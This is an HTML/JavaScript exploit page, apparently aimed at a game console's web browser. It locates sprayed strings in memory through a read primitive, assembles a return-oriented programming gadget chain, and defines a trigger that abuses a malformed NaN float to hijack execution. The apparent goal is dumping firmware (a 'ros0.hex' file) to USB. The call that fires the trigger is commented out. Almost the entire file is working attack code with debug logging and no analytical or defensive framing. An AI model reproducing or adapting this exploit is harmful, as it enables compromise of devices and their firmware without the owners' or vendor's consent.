<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>
var offsets = new Array();
//var offsets = [];

function findJsVariableOffset(name,exploit_data,search_base,search_size,pattern,len)
{
	try
	{
		var exploit = document.getElementById('exploit');
		var temp = readMemory(exploit,search_base, search_size+6);
		// move past "local("
		var dat = temp.substr(6, search_size);
		temp=null;
		// loop searching for tag
		for (var i=0;i<(search_size*2);i+=0x4)
		{
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				// loop next bytes for comparison
				for (var k = 0; k < len; k+=0x2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					var cont = 0;
					if(offsets.length > 0)
					{
						for(var idx = 0;idx < offsets.length;idx+=1)
						{
							if(offsets[idx]==exploit_addr)
							{
								cont = 1;
								break;
							}
						}
						if(cont == 1)
						{
							dbg(exploit_addr.toString(16) + " is ignored.");
							cont=0;
							continue;
						}
					}
					//offsets[offsets.length] = exploit_addr;
					offsets.push(exploit_addr);
					dat=null;
					exploit=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		exploit=null;
		var end_range = search_base+search_size;
		dbg("The string variable named " + name + " could not be located in range " + search_base.toString(16) + " - " + end_range.toString(16));
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}
function trigger(exploit_addr)
{
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}
function initROP(){
	
	try
	{
		var gadgets,fd,wb,usb_fp,rosdump,jump_2,jump_1;
		var fd_addr=0;
		var wb_addr=0;
		var usb_fp_addr=0;
		var rosdump_addr=0;
		var gadgets_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;

		dbg("Processing.. Searching memory range for fd string offset....");
		fd =  unescape("\u4444\u4141\u4141\u2FFA"); // 4 bytes to store int fd + 4 for place holders
		do{
			fd = fd.replaceAt(0x00/2,hexh2bin(0x2FFA));
			//fd_addr = findJsVariableOffset("fd",fd,0x80150000,0x450000,0x2FFA,0x4);
			fd_addr = findJsVariableOffset("fd",fd,0x80180000,0xF8000,0x2FFA,0x4);
		}
		while(fd_addr==0);
		//while((fd_addr==0) || (fd_addr>0x80340000));
		//if(fd_addr==0){dbg("Could not find fd offset");return;}
		
		dbg("Processing.. Searching memory range for wb string offset....");
		wb =  unescape("\u4444\u7762\u0000\u2FFB"); // 4 bytes to store wb string + 4 for place holders
		do{
			wb = wb.replaceAt(0x00/2,hexh2bin(0x2FFB));
			wb_addr = findJsVariableOffset("wb",wb,0x80180000,0xF8000,0x2FFB,0x4);
		}
		while(wb_addr==0);
		//if(wb_addr==0){dbg("Could not find wb offset");return;}
		
		dbg("Processing.. Searching memory range for usb_fp string offset....");
		//2F 64 65 76 5F 75 73 62 30 30 30 2F 72 6F 73 30 2E 68 65 78 00   "/dev_usb000/ros0.hex"
		usb_fp =  unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u726F\u7330\u2E68\u6578\u00FC"); // 21 bytes for path to fopen + 3 for place holders
		do{
				usb_fp = usb_fp.replaceAt(0x00/2,hexh2bin(0x2FFC));
				usb_fp_addr = findJsVariableOffset("usb_fp",usb_fp,0x80180000,0xF8000,0x2FFC,0xC);
		}
		while(usb_fp_addr==0);
		//if(usb_fp_addr==0){dbg("Could not find usb_fp offset");return;}
		
		dbg("Processing.. Searching memory range for ros dump string offset....");
		rosdump = unescape("\u4444\u4141\u4141\u2FFD");
		do{
			//rosdump =  rosdump+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u2FFD");//200 bytes + 2 bytes placeholder
			rosdump = rosdump.replaceAt(0x00/2,hexh2bin(0x2FFD));
			rosdump_addr = findJsVariableOffset("rosdump",rosdump,0x80278000,0x1D8000,0x2FFD,0x4);
		}
		while(rosdump_addr==0);
		//if(rosdump_addr==0){dbg("Could not find rosdump offset");return;}
		
		
		// DEX
		// \u4141 is used for general padding
		// other \u4x4x are used as placeholders for runtime replacement by js replaceAt calls
		// Other values like \u2424\u2424\u2424\u2424 means that this 8 byte value will eventually be loaded into r24 by one of the gadgets
		
		gadgets =  unescape("\u4444\u0009\u76BC\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0061\u61C8\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0061\u61C8\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7EFC");//200 bytes
		gadgets = gadgets.replaceAt(0x010/2, hexh2bin((fd_addr) >> 16));
		gadgets = gadgets.replaceAt(0x012/2, hexh2bin(fd_addr));
		gadgets = gadgets.replaceAt(0x016/2, hexh2bin((wb_addr) >> 16));
		gadgets = gadgets.replaceAt(0x018/2, hexh2bin(wb_addr));
		gadgets = gadgets.replaceAt(0x01C/2, hexh2bin((usb_fp_addr) >> 16));
		gadgets = gadgets.replaceAt(0x01E/2, hexh2bin(usb_fp_addr));
		gadgets = gadgets.replaceAt(0x022/2, hexh2bin((rosdump_addr) >> 16));
		gadgets = gadgets.replaceAt(0x024/2, hexh2bin(rosdump_addr));
		
		
		setCookie("D4T__C00K13___" + gadgets);
		//setCookie("D4T__C00K13___");
		// found cookie at
		// 0x8015CCE8
		// 0x8017E953
		// 0x
		// 0x
		// 0x
		
		// schedule a previously defined function to be run
		//runOnLoad(functionName);

		// schedule an anonymous function to be run
		//runOnLoad(function(){
		//  alert('I am an anonymous function');
		//});
		
		dbg("Processing.. Searching memory range for gadgets string offset....");
		do{
		
		gadgets = gadgets.replaceAt(0x00/2,hexh2bin(0x7EFC));
		gadgets_addr = findJsVariableOffset("gadgets",gadgets,0x80180000,0xF8000,0x7EFC,0x5DE);
		//gadgets_addr = findJsVariableOffset("gadgets",gadgets,0x80280000,0xFD0F0,0x7EFC,0x5DE);
		
		//setTimeout(function(){ gadgets_addr = findJsVariableOffset("gadgets",gadgets,0x80180000,0xF8000,0x7EFC,0x5DE); }, 1000);
		//clearTimeout(gadgets_addr);
		}
		while(gadgets_addr==0);
		//if(gadgets_addr==0){dbg("Could not find gadgets offset");return;}
		
		dbg("Processing.. Searching memory range for jump_2 string offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4444\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7EFB"); // 72 bytes
		jump_2 = jump_2.replaceAt(0x32/2, hexh2bin((gadgets_addr) >> 16));
		jump_2 = jump_2.replaceAt(0x34/2, hexh2bin(gadgets_addr));	
		do{
		jump_2 = jump_2.replaceAt(0x00/2,hexh2bin(0x7EFB));
		jump_2_addr = findJsVariableOffset("jump_2",jump_2,0x80180000,0xF8000,0x7EFB,0x24);
		}
		while(jump_2_addr==0);
		//if(jump_2_addr==0){dbg("Could not find jump_2 offset");return;}
		
		dbg("Processing.. Searching memory range for jump_1 string offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7EFA"); // 8 bytes == 4 bytes + 4 bytes placeholders
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{
		jump_1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7EFA));
		jump_1_addr = findJsVariableOffset("jump_1",jump_1,0x80180000,0xF8000,0x7EFA,0x4);
		}
		while(jump_1_addr==0);
		//if(jump_1_addr==0){dbg("Could not find jump_1 offset");return;}
		
		
		dbg("All string offsets have been found....");
		dbg("Summary:");
		dbg("gadget: "+a2hex(fd));
		dbg("fd variable offset: "+fd_addr.toString(16));
		dbg("gadget: "+a2hex(wb));
		dbg("wb variable offset: "+wb_addr.toString(16));
		dbg("gadget: "+a2hex(usb_fp));
		dbg("usb_fp variable offset: "+usb_fp_addr.toString(16));
		dbg("gadget: "+a2hex(rosdump));
		dbg("rosdump variable offset: "+rosdump_addr.toString(16));
		dbg("gadget: "+a2hex(gadgets));
		dbg("gadgets variable offset: "+gadgets_addr.toString(16));
		dbg("gadget: "+a2hex(jump_2));
		dbg("jump_2 variable offset: "+jump_2_addr.toString(16));
		dbg("gadget: "+a2hex(jump_1));
		dbg("jump_1 variable offset: "+jump_1_addr.toString(16));	
		dbg("Triggering exploit....");
		//trigger(jump_1_addr);		
		return;
	} catch(e) {
		dbg(e);
	}
}

function setCookie(value){
    document.cookie = value;
}

function getCookie(){
	alert(document.cookie);
}
</script>
</head>
<body id="BodyID" onload="initROP();">
		If this message appears without further log below, the exploit failed! Refresh the browser...<br>
		<div id="exploit" />
		<br>
		<div id="log"></div>
	</body>
</html id="7ND__0F__EXPL01T">
